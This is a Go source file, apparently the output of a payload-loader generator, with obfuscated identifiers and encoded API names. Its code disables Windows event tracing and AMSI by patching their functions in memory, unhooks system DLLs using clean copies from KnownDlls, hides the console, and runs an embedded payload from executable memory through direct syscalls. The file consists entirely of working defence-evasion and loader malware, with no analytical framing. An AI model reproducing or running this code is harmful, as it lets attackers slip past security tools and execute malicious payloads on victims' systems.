
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"vyprESnjGhsgUjyQbF/vyprESnjGhsgUjyQbF"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		dEeHxUIo= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		ClCyMEbl uint16
		aAojSNfR uint16
		OkaytkFd int = 5
	)

	
	
	
	
	func gctfM() string {
		bidCT, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		sBtlO, _, _ :=  bidCT.GetStringValue("CurrentVersion")
		frXQi, _, err := bidCT.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//wgdk, _, _ := bidCT.GetIntegerValue("CurrentMinorVersionNumber")
			sBtlO = strconv.FormatUint(frXQi, 10)
		}
		defer bidCT.Close()
		if sBtlO == "10" {
			ClCyMEbl = 0x18
			aAojSNfR = 0x50
		} else if sBtlO == "6.3" {
			ClCyMEbl = 0x17
			aAojSNfR = 0x4f
		} else if sBtlO == "6.2" {
			ClCyMEbl = 0x16
			aAojSNfR = 0x4e
		} else if sBtlO == "6.1" {
			ClCyMEbl = 0x15
			aAojSNfR= 0x4d
		}
		return sBtlO 

	}

	func MhrY(CoKybIG string,) string {
		var Mhebghft []byte
			Mhebghft, _ = base64.StdEncoding.DecodeString(CoKybIG)
		cmrGt := 1
		for i := 1; i < OkaytkFd; i++ {
			Mhebghft, _ = base64.StdEncoding.DecodeString(string(Mhebghft))
			cmrGt += i
		}
		return string(Mhebghft)
	
	}

	

	func IOcAVqMjlpYXcIXl(show bool) {
		keXTuvFrIK := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(MhrY("Vmxkd1MxWXdNVWRTV0d4UVYwWmFjVlJYY0hObGJHUnpWMjEwYWxJd2NEQldWelZoWVRKU05rMUVhejA9"))
		pMSCLFhUEbPnNrXC := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(MhrY("Vm14U1MySXlVblJWV0doaFUwVktjRmxzV2t0TmJIQkpXWHBzVVZWVU1Eaz0="))
		gZDaivXykIuNxC, _, _ := keXTuvFrIK.Call()
		if gZDaivXykIuNxC == 0 {
			return
		}
		if show {
		var wEpsEFaVqW uintptr = 9
		pMSCLFhUEbPnNrXC.Call(gZDaivXykIuNxC, wEpsEFaVqW)
		} else {
		var HADjrMuSHIc uintptr = 0
		pMSCLFhUEbPnNrXC.Call(gZDaivXykIuNxC, HADjrMuSHIc)
		}
	}



	
	const (
		FKDZqhl= 997
	)
	var koYZd error = syscall.Errno(FKDZqhl)
	var yCRSl = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(MhrY("Vm0xd1QxTXlUa2hWYTJoWFlrVmFjVmxzVW5OalZtUnpZVVU1YkdKR1NsbFdiVFZUWVZVd2QySjZSVDA9"))


	func ERqVYY(SZeeAzb uintptr, juCYMy uintptr, syzvxyS *byte, omnqvli uintptr, ALCnR *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(yCRSl.Addr(), 5, uintptr(SZeeAzb), uintptr(juCYMy), uintptr(unsafe.Pointer(syzvxyS)), uintptr(omnqvli), uintptr(unsafe.Pointer(ALCnR)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = vHjCOOL(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func vHjCOOL(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case FKDZqhl:
			return koYZd
		}
	
		return e
	}
	

	
	var breBbxYm = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(MhrY("VmxkNGIxVXdNSGhWYmxKUVZrVktiMVpxUm5ka01XUlZVMnRrVGxJd1dsbFVNV2hYVm0xS1YxZHVWbHBXYldoUVZGVmFkMWRXVGxWTlJEQTk="))
	var sMgPKUM = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(MhrY("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0V1JtUnpXa2QwYWxJd01UWldWekUwWVd4d05rMUVhejA9"))
	var QWxgOWM = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(MhrY("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsZFdNbkJIWVZaSmVsbDZhejA9"))
	var icmtamK = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(MhrY("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsTlZSbEYzVUZFOVBRPT0="))

	func aityenj() {
		jHLs := uintptr(0xffffffffffffffff)
		TGrZ := []uintptr{ breBbxYm.Addr(), sMgPKUM.Addr(), QWxgOWM.Addr(), icmtamK.Addr()}
		for i, _ := range TGrZ {
			MmoR, _ := hex.DecodeString("4833C0C3")
			var GpoNSSf uintptr
			QTfWz := len(MmoR)
			ERqVYY(jHLs, TGrZ[i], &MmoR[0], uintptr(uint32(QTfWz)), &GpoNSSf)
		}
	}

	func jAZMD(jHLs windows.Handle) {
		TGrZ := []uintptr{ breBbxYm.Addr(), sMgPKUM.Addr(), QWxgOWM.Addr(), icmtamK.Addr()}
		for i, _ := range TGrZ {
			MmoR, _ := hex.DecodeString("4833C0C3")
			var GpoNSSf uintptr
			QTfWz := len(MmoR)
			ERqVYY(uintptr(jHLs), TGrZ[i], &MmoR[0], uintptr(uint32(QTfWz)), &GpoNSSf)
		}
	}



	
	func iSiZJZqC() {
		var xSqB uint64
		xSqB = 0xffffffffffffffff
		PCgGZaN, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		LPfBwLI, _ := windows.GetProcAddress(PCgGZaN, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		dnVk, _ :=  hex.DecodeString("B857000780C3")
		var BCHDq uintptr
		FVDFuCG := len(dnVk)
		ERqVYY(uintptr(xSqB), uintptr(uint(LPfBwLI)), &dnVk[0], uintptr(uint32(FVDFuCG)), &BCHDq)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func dWkM() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		aityenj()
		iSiZJZqC()
		time.Sleep(2749 * time.Millisecond)
		sBtlO := gctfM()
		
		if sBtlO == "10" {
			HzqHRtNpSuA()
		}
		aityenj()
		IOcAVqMjlpYXcIXl(false)
		lBCVipzwix := vyprESnjGhsgUjyQbF.NJcBgujPGXWCNrdl()
		CgZrOGTRMkPK(lBCVipzwix)
	}

	
	func CgZrOGTRMkPK(lBCVipzwix []byte){
		CUeXRgAgdDVmFMipAg := windows.NewLazySystemDLL("ntdll.dll")
		KpPgkOIszDKNSe := windows.NewLazySystemDLL("kernel32")
		zKgUIsGpuHZQ := CUeXRgAgdDVmFMipAg.NewProc("RtlCopyMemory")
		pfdCahuHilIG := KpPgkOIszDKNSe.NewProc("VirtualAlloc")

		var zjsdFuCnwU, tTGpLzmJhv uintptr
		var boQgydTuUTQSteT uintptr
		BQBzkivIjyhw := uintptr(0xffffffffffffffff)
		dpjELoCILRKwZs := uintptr(len(lBCVipzwix))
		tTGpLzmJhv = 0x40
		zjsdFuCnwU = 0x3000
		FDRMCvrESKztisU, _, _ := pfdCahuHilIG.Call(0, uintptr(len(lBCVipzwix)), zjsdFuCnwU, tTGpLzmJhv)

		
		zKgUIsGpuHZQ.Call(FDRMCvrESKztisU, (uintptr)(unsafe.Pointer(&lBCVipzwix[0])), uintptr(len(lBCVipzwix)))
		
		


		vyprESnjGhsgUjyQbF.TBKSXcTOirtBN(
			aAojSNfR, 
			BQBzkivIjyhw,
			(*uintptr)(unsafe.Pointer(&FDRMCvrESKztisU)),
			&dpjELoCILRKwZs,
			0x20,
			&boQgydTuUTQSteT,
			)
		
		syscall.Syscall(FDRMCvrESKztisU, 0, 0, 0, 0)
	}


	
	
		var sYOdkIzLAMCuO      uint16
		var aIKuRpqUODidw uint16
		var WCiJbQXwqP      uint16
		func HzqHRtNpSuA()  {
			oddQtMFrcWrGNAk := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range oddQtMFrcWrGNAk {
			KnownDLL(oddQtMFrcWrGNAk[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(sMZrXhRAuhdhwAgYJG  string) []byte {
			
			var ibkIiInVchF , tIGsbqJFPkss , HbBMnHSeVaZNa  uintptr
			TfMynTlLGPr := uintptr(0xffffffffffffffff)
			FIcMgqyHnfMkNbp := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + sMZrXhRAuhdhwAgYJG 
			BoGFVBJpbwBvYaobLc, _ := windows.NewNTUnicodeString(FIcMgqyHnfMkNbp)
			WCrHxtxdGw := windows.OBJECT_ATTRIBUTES{}
			WCrHxtxdGw.Attributes = 0x00000040
			WCrHxtxdGw.ObjectName = BoGFVBJpbwBvYaobLc
			WCrHxtxdGw.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			eCnATrqyrJsZMXO := dWkM()
			sYOdkIzLAMCuO = 0x37
			QgNjEXGSQfxtg := 0x0004
			r, _ := vyprESnjGhsgUjyQbF.BcRcTavKFRho(
				sYOdkIzLAMCuO, 
				eCnATrqyrJsZMXO, 
				uintptr(unsafe.Pointer(&ibkIiInVchF)), 
				uintptr(QgNjEXGSQfxtg), 
				uintptr(unsafe.Pointer(&WCrHxtxdGw)),
			)
			if r != 0 {
			}
			aIKuRpqUODidw = 0x28
			zero := 0
			one := 1
			vyprESnjGhsgUjyQbF.RuDokHFxjAFxZLCZVnJ(
				aIKuRpqUODidw, 
				eCnATrqyrJsZMXO, 
				ibkIiInVchF, 
				TfMynTlLGPr, 
				uintptr(unsafe.Pointer(&HbBMnHSeVaZNa)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&tIGsbqJFPkss)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			hqXuXBOFAbjPzIMiCz := rawreader.New(HbBMnHSeVaZNa, int(tIGsbqJFPkss))
			oJxFhUYgfUkbrGqTm, _ := pe.NewFileFromMemory(hqXuXBOFAbjPzIMiCz)
			auCgUaIcYyReZsp, err := oJxFhUYgfUkbrGqTm.Bytes()
			if err != nil {
			}
			mqLmNdgkIXClfXmJTi := oJxFhUYgfUkbrGqTm.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			uuivPzdhhGuksNw := auCgUaIcYyReZsp[mqLmNdgkIXClfXmJTi.Offset:mqLmNdgkIXClfXmJTi.Size]
			CknbEEQKcynZCwOx, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  sMZrXhRAuhdhwAgYJG )
			if error != nil {
			}
			RGzTYILRVGG := CknbEEQKcynZCwOx.Section(".text")
			YszNtuVaZampK, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  sMZrXhRAuhdhwAgYJG )
			if error != nil {
			}
			QuVwJxiFBMyXSnGZ := YszNtuVaZampK.Handle
			DhJzcQleYGrq  := uintptr(QuVwJxiFBMyXSnGZ)
			mViCaeLZMx := uint(DhJzcQleYGrq) + uint(RGzTYILRVGG.VirtualAddress)
			WCiJbQXwqP = 0x50
			SUyhevFoSEJd := uintptr(len(uuivPzdhhGuksNw))
			var qApHuNJPdtpCpaXX uintptr

			kbehtFnNXIE, _ := vyprESnjGhsgUjyQbF.BQgefgReXMXwlBCzRFU(
				WCiJbQXwqP, 
				eCnATrqyrJsZMXO, 
				TfMynTlLGPr, 
				(*uintptr)(unsafe.Pointer(&mViCaeLZMx)), 
				&SUyhevFoSEJd, 
				0x40, 
				&qApHuNJPdtpCpaXX,
			)
			if kbehtFnNXIE != 0 {
			}
			fPAZhTNWghzwWRPRQE(uuivPzdhhGuksNw, uintptr(mViCaeLZMx))
			CknbEEQKcynZCwOx.Close()
			kbehtFnNXIE, _ = vyprESnjGhsgUjyQbF.BQgefgReXMXwlBCzRFU(
				WCiJbQXwqP, 
				eCnATrqyrJsZMXO, 
				TfMynTlLGPr, 
				(*uintptr)(unsafe.Pointer(&mViCaeLZMx)), 
				&SUyhevFoSEJd, 
				0x20, 
				&qApHuNJPdtpCpaXX,
			)
			if kbehtFnNXIE != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(TfMynTlLGPr), HbBMnHSeVaZNa, 0)
			return uuivPzdhhGuksNw
		}


		func fPAZhTNWghzwWRPRQE(ZZObzGavauQapPIRUR []byte, bOtrSihFuLwrmKk uintptr) {
			for lSNEtGkVgn := uint32(0); lSNEtGkVgn < uint32(len(ZZObzGavauQapPIRUR)); lSNEtGkVgn++ {
				ndeggRQNIaMR := unsafe.Pointer(bOtrSihFuLwrmKk + uintptr(lSNEtGkVgn))
				zaHxTWuvcgBnblnXN := (*byte)(ndeggRQNIaMR)
				*zaHxTWuvcgBnblnXN = ZZObzGavauQapPIRUR[lSNEtGkVgn]
			}
		}

	
